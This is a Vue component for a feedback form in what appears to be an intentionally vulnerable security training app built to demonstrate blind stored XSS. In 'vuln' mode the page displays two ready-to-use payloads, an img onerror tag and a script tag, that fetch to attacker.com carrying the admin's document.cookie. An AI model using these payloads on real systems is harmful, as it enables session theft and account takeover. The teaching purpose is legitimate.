<template>
  <div class="feedback-page">
    <div class="container">
      <div class="feedback-container card">
        <h2>意见反馈</h2>
        <p class="subtitle">您的反馈对我们非常重要</p>
        
        <el-form
          ref="formRef"
          :model="form"
          :rules="rules"
          label-position="top"
          size="large"
          @submit.prevent="handleSubmit">
          <el-form-item label="邮箱" prop="email">
            <el-input v-model="form.email" placeholder="your@email.com" />
          </el-form-item>
          
          <el-form-item label="反馈内容" prop="content">
            <el-input
              v-model="form.content"
              type="textarea"
              :rows="8"
              placeholder="请详细描述您的问题或建议...&#10;&#10;（支持HTML格式，用于演示盲XSS）"
            />
          </el-form-item>
          
          <el-form-item>
            <el-button type="primary" native-type="submit" :loading="loading" class="submit-btn">
              提交反馈
            </el-button>
          </el-form-item>
        </el-form>
        
        <!-- XSS 提示（L3 盲 XSS）：仅在 VULN 模式展示攻击示例 -->
        <div class="demo-info" v-if="configStore.xssMode === 'vuln'">
          <h3>⚠️ 盲 XSS 演示（L3）</h3>
          <p>此表单的内容将被保存到数据库，当管理员在后台查看时触发 XSS。</p>
          <p>尝试提交以下载荷：</p>
          <code>&lt;img src=x onerror="fetch('https://attacker.com/cookie?c='+document.cookie)"&gt;</code>
          <p style="margin-top: 12px;">或更隐蔽的方式：</p>
          <code>&lt;script&gt;fetch('https://attacker.com/admin-data?cookie='+document.cookie+'&url='+location.href)&lt;/script&gt;</code>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
// 反馈页（L3）：演示盲 XSS
// - 用户提交的富文本会被存入数据库
// - 管理员在后台查看详情时触发（VULN）/被拦截（SECURE）
import { ref } from 'vue';
import { useRouter } from 'vue-router';
import { useConfigStore } from '@/stores/config';
import axios from '@/api/axios';
import { ElMessage } from 'element-plus';

const router = useRouter();
const configStore = useConfigStore();
const formRef = ref();
const loading = ref(false);

const form = ref({
  email: '',
  content: ''
});

const rules = {
  email: [
    { required: true, message: '请输入邮箱', trigger: 'blur' },
    { type: 'email', message: '请输入有效的邮箱地址', trigger: 'blur' }
  ],
  content: [
    { required: true, message: '请输入反馈内容', trigger: 'blur' },
    { min: 10, message: '反馈内容至少10个字符', trigger: 'blur' }
  ]
};

const handleSubmit = async () => {
  const valid = await formRef.value.validate().catch(() => false);
  if (!valid) return;
  
  loading.value = true;
  try {
    await axios.post('/feedback', form.value);
    ElMessage.success('反馈提交成功，感谢您的宝贵意见！');
    form.value = { email: '', content: '' };
    formRef.value.resetFields();
  } catch (error) {
    ElMessage.error('提交失败，请稍后重试');
  } finally {
    loading.value = false;
  }
};
</script>

<style scoped>
.feedback-page {
  padding: var(--spacing-2xl) 0;
  min-height: calc(100vh - 80px);
}

.feedback-container {
  max-width: 800px;
  margin: 0 auto;
  padding: var(--spacing-2xl);
}

.feedback-container h2 {
  text-align: center;
  font-size: 2rem;
  margin-bottom: var(--spacing-sm);
}

.subtitle {
  text-align: center;
  color: var(--color-text-secondary);
  margin-bottom: var(--spacing-xl);
}

.submit-btn {
  width: 100%;
}

.demo-info {
  margin-top: var(--spacing-2xl);
  padding: var(--spacing-lg);
  background: rgba(251, 146, 60, 0.1);
  border: 2px solid rgba(251, 146, 60, 0.3);
  border-radius: var(--radius-md);
}

.demo-info h3 {
  color: var(--color-accent);
  margin-bottom: var(--spacing-md);
}

.demo-info p {
  color: var(--color-text-secondary);
  margin-bottom: var(--spacing-sm);
}

.demo-info code {
  display: block;
  margin-top: var(--spacing-sm);
  padding: var(--spacing-sm);
  background: var(--color-bg-elevated);
  border-radius: var(--radius-sm);
  font-size: 0.85rem;
  overflow-x: auto;
  color: var(--color-accent);
}
</style>
